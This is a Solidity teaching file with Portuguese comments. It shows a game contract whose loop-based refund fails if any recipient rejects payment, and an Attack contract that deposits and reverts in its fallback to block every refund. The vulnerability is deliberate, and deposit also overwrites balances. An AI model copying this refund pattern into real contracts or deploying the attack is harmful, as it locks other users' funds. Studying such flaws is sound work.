// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Jogo com vulnerabilidade de DoS, os jogadores depositam dinheiro primeiro e, após o término do jogo, chamam a função deposit para retirar o dinheiro.
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;
    
    // Todos os jogadores depositam ETH no contrato
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // Registrar depósito
        balanceOf[msg.sender] = msg.value;
        // Registrar endereço do jogador
        players.push(msg.sender);
    }

    // O jogo acabou, o reembolso começou e todos os jogadores receberão o reembolso em sequência.
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // Através de um loop, reembolsar todos os jogadores
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}

contract Attack {
    // Ao solicitar um reembolso, ocorre um ataque de negação de serviço (DoS)
    fallback() external payable{
        revert("DoS Attack!");
    }

    // Participar do jogo DoS e fazer um depósito.
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}